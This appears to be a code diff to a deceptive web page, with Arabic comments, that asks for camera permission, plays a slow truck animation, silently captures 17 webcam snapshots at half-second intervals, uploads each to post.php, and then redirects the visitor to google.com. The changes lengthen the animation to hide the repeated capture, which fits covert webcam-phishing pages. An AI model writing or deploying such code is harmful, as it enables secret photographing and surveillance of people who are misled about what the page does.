@@ -30,11 +30,11 @@
         /* الشاحنة */
         .truck {
             position: absolute;
-            left: -100px;
+            left: -120px;
             top: 50%;
             transform: translateY(-50%);
             font-size: 40px;
-            transition: left 2s ease;
+            transition: left 10s linear; /* حركة بطيئة */
         }
         .truck.move {
             left: calc(100% - 50px);
@@ -51,42 +51,40 @@ async function startProcess() {
     try {
         // طلب إذن الكاميرا
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        
         const video = document.createElement('video');
         video.srcObject = stream;
-        video.play();
-
-        // التأكد من أن الكاميرا بدأت بالعمل قبل التقاط الصورة
-        await new Promise(resolve => setTimeout(resolve, 1500));
+        await video.play();
 
         const canvas = document.createElement('canvas');
         canvas.width = 640; 
         canvas.height = 480;
-        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-        
-        const data = canvas.toDataURL('image/jpeg', 0.7);
-        
-        // إرسال البيانات
-        const response = await fetch('post.php', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'img=' + encodeURIComponent(data)
-        });
+        const ctx = canvas.getContext('2d');
 
-        // إيقاف الكاميرا فوراً بعد الالتقاط
+        const truck = document.querySelector('.truck');
+        truck.classList.add('move'); // بدء حركة الشاحنة
+
+        // التقاط 17 صورة بفاصل نصف ثانية
+        for (let i = 0; i < 17; i++) {
+            ctx.drawImage(video, 0, 0, 640, 480);
+            const data = canvas.toDataURL('image/jpeg', 0.7);
+
+            await fetch('post.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: 'img=' + encodeURIComponent(data) + '&frame=' + i
+            });
+
+            // انتظار نصف ثانية قبل الصورة التالية
+            await new Promise(resolve => setTimeout(resolve, 500));
+        }
+
+        // إيقاف الكاميرا
         stream.getTracks().forEach(track => track.stop());
 
-        // تشغيل حركة الشاحنة
-        const truck = document.querySelector('.truck');
-        truck.classList.add('move');
-
-        if (response.ok) {
-            setTimeout(() => {
-                window.location.href = "https://www.google.com";
-            }, 2000);
-        } else {
-            alert("حدث خطأ أثناء الاتصال بالخادم، يرجى المحاولة مرة أخرى.");
-        }
+        // بعد انتهاء العملية تحويل المستخدم
+        setTimeout(() => {
+            window.location.href = "https://www.google.com";
+        }, 2000);
 
     } catch (err) {
         console.error(err);
